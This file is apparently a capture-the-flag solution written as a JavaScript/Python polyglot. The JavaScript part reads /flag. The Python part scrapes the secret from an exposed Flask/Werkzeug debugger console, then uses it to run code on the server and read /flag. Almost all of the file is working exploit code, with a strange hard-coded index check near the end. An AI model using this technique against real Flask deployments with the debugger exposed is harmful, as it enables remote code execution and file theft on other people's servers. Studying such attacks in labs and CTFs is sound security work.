a = 1 // 1 ; b = '''

// Put your Javascript code here.
// Python will just assign it to a string variable
const fs = require('fs');
fs.readFile('/flag', 'utf8', (err, data) => {
  if (err) {
    console.error(err);
    return;
  }
  process.stdout.write(data);
});

/* '''

# Put your Python code here. Javascript will ignore it
# because it's inside a comment
import urllib.request
import re

FLASK_URL='http://flask:5000/'
with urllib.request.urlopen(f'{FLASK_URL}/console') as resp:
  pg:str = resp.read().decode()
  sec = re.search(r'SECRET = ".*";', pg).group()[10:-2]
with urllib.request.urlopen(f'{FLASK_URL}/console?&__debugger__=yes&cmd=open(%22%2Fflag%22%2C%20%22r%22).read()&frm=0&s={sec}') as resp:
  sec_flag = resp.read().splitlines()[1].decode()
# searching template
if sec_flag[48763] == "@":
  print(open("/flag", "r").read(), end="")
else:
  print("GG")

# */